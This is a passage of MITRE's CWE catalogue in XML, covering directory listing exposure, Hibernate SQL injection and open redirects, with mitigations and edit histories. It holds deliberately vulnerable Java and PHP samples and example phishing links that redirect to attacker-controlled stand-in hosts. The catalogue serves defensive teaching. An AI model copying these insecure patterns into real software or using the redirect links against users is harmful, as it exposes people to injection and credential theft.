               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="548" Name="Information Exposure Through Directory Listing" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.</Description>
         <Extended_Description>A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="552" View_ID="1000"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Note>Exposing the contents of a directory can lead to an attacker gaining access to source code or providing useful information for the attacker to devise exploits, such as creation times of files or any information that may be encoded in file names. The directory listing may also compromise private or confidential data.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>System Configuration</Phase>
               <Description>Recommendations include restricting access to important directories or files by adopting a need to know requirement for both the document and server root, and turning off features such as Automatic Directory Listings that could expose private files and provide information that could be utilized by an attacker when formulating or conducting an attack.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Insecure Configuration Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>16</Entry_ID>
               <Entry_Name>Directory Indexing</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2011-03-29">Information Leak Through Directory Listing</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="564" Name="SQL Injection: Hibernate" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>Using Hibernate to execute a dynamic SQL statement built with user-controlled input can allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="89" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="89" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="89" View_ID="928" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>A non-SQL style database which is not subject to this flaw may be chosen.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Follow the principle of least privilege when creating user accounts to a SQL database. Users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Implement SQL strings using prepared statements that bind variables. Prepared statements that do not bind variables can be vulnerable to attack.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use vigorous whitelist style checking on any user input that may be used in a SQL command. Rather than escape meta-characters, it is safest to disallow them entirely. Reason: Later use of data that have been entered in the database may neglect to escape meta-characters before use. Narrowly define the set of safe characters based on the expected value of the parameter in the request.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code excerpt uses Hibernate's HQL syntax to build a dynamic query that's vulnerable to SQL injection.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String street = getStreetFromUser();<xhtml:br/>Query query = session.createQuery("from Address a where a.street='" + street + "'");</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="109"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="601" Name="URL Redirection to Untrusted Site ('Open Redirect')" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.</Description>
         <Extended_Description>An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Phishing is a general term for deceptive attempts to coerce private information from users that will be used for identity theft.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Open Redirect</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross-site Redirect</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross-domain Redirect</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Low</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>The user may be redirected to an untrusted page that contains malware which may then compromise the user's machine. This will expose the user to extensive risk and the user's interaction with the web server may also be compromised if the malware conducts keylogging or other attacks that steal credentials, personally identifiable information (PII), or other important data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Other</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Other</Impact>
               <Note>The user may be subjected to phishing attacks by being redirected to an untrusted page. The phishing attack may point to an attacker controlled web page that appears to be a trusted web site. The phishers may then steal the user's credentials and then use these credentials to access the legitimate web site.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method>Manual Static Analysis</Method>
               <Description>Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated black box tools that supply URLs to every input may be able to spot Location header modifications, but test case coverage is a factor, and custom redirects may not be detected.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Automated static analysis tools may not be able to determine whether input influences the beginning of a URL, which is important for reducing false positives.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Other</Method>
               <Description>Whether this issue poses a vulnerability will be subject to the intended behavior of the application. For example, a search engine might intentionally provide redirects to arbitrary URLs.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>Use a whitelist of approved URLs or domains to be used for redirection.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving the current site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems (CWE-79) when generating the disclaimer page.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.2">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>
                  <xhtml:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</xhtml:p>
                  <xhtml:p>For example, ID 1 could map to "/login.asp" and ID 2 could map to "http://www.example.com/". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that no externally-supplied requests are honored by requiring that all redirect requests include a unique nonce generated by the application [REF-483]. Be sure that the nonce is not predictable (CWE-330).</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79).</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code obtains a URL from the query string and then redirects the user to that URL.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$redirect_url = $_GET['url'];<xhtml:br/>header("Location: " . $redirect_url);</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with the above code is that an attacker could use this page as part of a phishing scam by redirecting users to a malicious site. For example, assume the above code is in the file example.php. An attacker could supply a user with the following link:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>http://example.com/example.php?url=http://malicious.example.com</xhtml:div>
               </Example_Code>
               <Body_Text>The user sees the link pointing to the original trusted site (example.com) and does not realize the redirection that could take place.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code is a Java servlet that will receive a GET request with a url parameter in the request to redirect the browser to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and send a response to redirect the browser to the url address.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>public class RedirectServlet extends HttpServlet {<xhtml:br/>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:div>protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>String query = request.getQueryString();<xhtml:br/>if (query.contains("url")) {<xhtml:div style="margin-left:10px;">
                                    <xhtml:div>String url = request.getParameter("url");<xhtml:br/>response.sendRedirect(url);</xhtml:div>
                                 </xhtml:div>
                                 <xhtml:br/>}</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>}</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with this Java servlet code is that an attacker could use the RedirectServlet as part of a e-mail phishing scam to redirect users to a malicious site. An attacker could send an HTML formatted e-mail directing the user to log into their account by including in the e-mail the following link:</Body_Text>
               <Example_Code Nature="attack" Language="HTML">
                  <xhtml:div>&lt;a href="http://bank.example.com/redirect?url=http://attacker.example.net"&gt;Click here to log in&lt;/a&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The user may assume that the link is safe since the URL starts with their trusted bank, bank.example.com. However, the user will then be redirected to the attacker's web site (attacker.example.net) which the attacker may have made to appear very similar to bank.example.com. The user may then unwittingly enter credentials into the attacker's web page and compromise their bank account. A Java servlet should never redirect a user to a URL without verifying that the redirect address is a trusted site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-4206</Reference>
               <Description>URL parameter loads the URL into a frame and causes it to appear to be part of a valid page.</Description>
               <Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4206</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2951</Reference>
               <Description>An open redirect vulnerability in the search script in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL as a parameter to the proper function.</Description>
               <Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2951</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2052</Reference>
               <Description>Open redirect vulnerability in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the proper parameter.</Description>
               <Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2052</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>38</Entry_ID>
               <Entry_Name>URl Redirector Abuse</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="194"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-483"/>
            <Reference External_Reference_ID="REF-484" Section="Page 43"/>
            <Reference External_Reference_ID="REF-485"/>
            <Reference External_Reference_ID="REF-45"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Background_Details, Description, Detection_Factors, Likelihood_of_Exploit, Name, Relationships, Observed_Example, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-03</Modification_Date>
               <Modification_Comment>updated References and Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Observed_Examples, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
